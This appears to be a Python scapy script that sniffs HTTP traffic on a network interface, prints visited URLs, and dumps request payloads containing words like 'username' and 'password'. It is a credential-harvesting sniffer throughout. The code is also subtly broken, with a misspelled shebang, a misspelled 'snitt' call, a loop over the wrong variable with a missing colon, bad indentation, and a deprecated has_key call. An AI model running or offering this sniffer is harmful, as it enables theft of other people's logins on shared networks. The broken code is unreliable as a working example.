#!/usr/bin/enc python

import scapy.all as scapy
from scapy.layers import http

def sniff(interface):
    scapy.snitt(iface=interface, store=False, prn=process_sniffed_packet)
    
def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
        print(url)
        if packet.has_key(scapy.Raw):
            load = packet[scapy.Raw].load
            keywords = ["username", "user", "pass" , "password"]
            for keyword in keyword
                if keyword in load:
                print(load)
                break

sniff("eth0")

